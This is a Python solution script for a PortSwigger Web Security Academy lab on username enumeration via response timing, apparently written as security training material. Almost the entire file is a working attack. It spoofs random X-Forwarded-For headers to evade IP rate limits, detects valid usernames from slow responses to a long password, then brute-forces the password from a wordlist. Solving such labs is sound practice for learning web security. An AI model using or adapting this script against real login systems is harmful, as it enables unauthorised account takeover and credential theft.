#!/usr/bin/env python3
# Lab: Username enumeration via response timing
# Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing>
# Difficulty: PRACTITIONER
import datetime
import random
import requests
import shutil
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(client, url, username, password):
    """Atempt to login.
    Return values:
      False on any condition not mentioned below
      2 if response indicates correct username but incorrect password
      3 if response is a redirect
    """
    headers = {'X-Forwarded-For': f'ABC{random.getrandbits(50)}'}
    data = {'username': username, 'password': password}

    r = client.post(url, headers=headers, data=data, allow_redirects=False, verify=False, proxies=proxies)

    if r.status_code == 302:
        return 3

    if r.elapsed > datetime.timedelta(milliseconds=1000):
        return 2

    return False


def enumerate_username(client, url, username_filename):
    with open(username_filename, 'r') as infile:
        for line in infile:
            username = line.rstrip()
            msg = f'[ ] Brute force username: {username}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
            if login(client, url, username, 'X' * 500) == 2:
                msg = f'[+] Username found: {username}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                return username

    return False


def enumerate_password(client, url, username, passwords_filename):
    with open(passwords_filename, 'r') as infile:
        for line in infile:
            password = line.rstrip()
            msg = f'[ ] Brute force password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
            if login(client, url, username, password) == 3:
                msg = f'[+] Password found: {password}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                return password
    return False


def main():
    print('[+] Username enumeration via response timing')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/login'
    username = enumerate_username(client, f'{url}', '../candidate_usernames.txt')
    if not username:
        print(f'[-] Failed to enumerate username')
        sys.exit(-2)

    password = enumerate_password(client, f'{url}', username, '../candidate_passwords.txt')
    if not password:
        print(f'[-] Failed to enumerate password')
        sys.exit(-3)

    if f'Your username is: {username}' not in client.get(f'{host}/my-account').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
